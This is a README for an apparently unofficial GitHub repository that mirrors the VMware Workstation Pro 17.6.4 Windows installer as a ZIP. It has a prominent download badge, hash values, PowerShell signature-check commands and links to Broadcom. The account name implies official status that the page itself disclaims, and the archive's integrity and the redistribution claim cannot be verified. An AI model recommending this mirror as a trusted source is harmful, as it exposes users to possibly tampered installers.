# VMware Workstation Pro 17.6.4 Download for Windows — ZIP (Build 24832109)

> Download the VMware Workstation Pro 17.6.4 Windows installer as a ZIP, verify its Broadcom Authenticode signature and SHA-256, and review the independent installation guide.

![Platform](https://img.shields.io/badge/platform-Windows-0078D4?logo=windows&logoColor=white)
![Product](https://img.shields.io/badge/product-VMware%20Workstation%20Pro-0A8F5B)
![Version](https://img.shields.io/badge/version-17.6.4%20%7C%2024832109-6B7280)
![Package](https://img.shields.io/badge/package-ZIP-2563EB)

## Download VMware Workstation Pro 17.6.4

<p align="center">
  <a href="https://github.com/rvtoolsofficial/vmware-workstation-17-6-4-download/releases/latest/download/VMware-Workstation-Pro-17.6.4-24832109.zip">
    <img src="https://img.shields.io/badge/CLICK_TO_DOWNLOAD-VMWARE_WORKSTATION_PRO_17.6.4_ZIP-00C853?style=for-the-badge&logo=vmware&logoColor=white" alt="Download VMware Workstation Pro 17.6.4 ZIP" height="72">
  </a>
</p>

<p align="center">
  <a href="https://github.com/rvtoolsofficial/vmware-workstation-17-6-4-download/releases/latest">Download version 17.6.4 from Releases</a>
</p>

The ZIP contains one file: the original Windows installer, `VMware-workstation-full-17.6.4-24832109.exe`. This is a version-specific archive for **VMware Workstation Pro 17.6.4, build 24832109**; it is not represented as the latest VMware release.

## Package verification

- **Installer publisher:** Broadcom Inc. (Authenticode signature validated)
- **Installer SHA-256:** `10FE3A36F525D88AA133118AB3B5A16B18DA88D4AA11B14D74E4164B3FB94BA9`
- **ZIP SHA-256:** `F72D97CCAA127683460E2FF3561FFFA5ED3F3D736EA7D03DEA1C67ECA47650BE`
- **Archive contents:** one original installer; its hash was checked against the desktop source file before packaging

After extracting the archive, verify the installer on Windows before running it:

```powershell
Get-AuthenticodeSignature .\VMware-workstation-full-17.6.4-24832109.exe
Get-FileHash .\VMware-workstation-full-17.6.4-24832109.exe -Algorithm SHA256
```

Confirm the signature status is `Valid`, review the signer name, and compare the hash above. Do not run the installer if either check fails.

## About VMware Workstation Pro

VMware Workstation Pro is a desktop hypervisor for creating and running virtual machines on a Windows or Linux host. It is used for development, testing, training, software compatibility checks, and lab environments. VM capabilities depend on host hardware, the selected guest operating system, and its licensing.

Broadcom announced that Workstation Pro became available at no charge for commercial, educational, and personal users beginning November 11, 2024. Review the current Broadcom download instructions and license terms; account and download requirements may change. No license key is required for the free version according to Broadcom's current guidance.

## Guides and official resources

- [Read the detailed VMware Workstation Pro 17.6.4 guide](https://github.com/rvtoolsofficial/vmware-workstation-17-6-4-guide)
- [Official VMware Workstation and Fusion product page](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion)
- [Broadcom download and licensing instructions](https://knowledge.broadcom.com/external/article/368667)
- [Broadcom Support Portal](https://support.broadcom.com/)

## License and independence notice

This repository is an independent mirror and is not an official VMware or Broadcom support channel. VMware Workstation and related marks belong to their respective owners. Use the software under the current vendor license terms. The uploader confirms they have authorization to redistribute this installer; verify the signature and terms before use.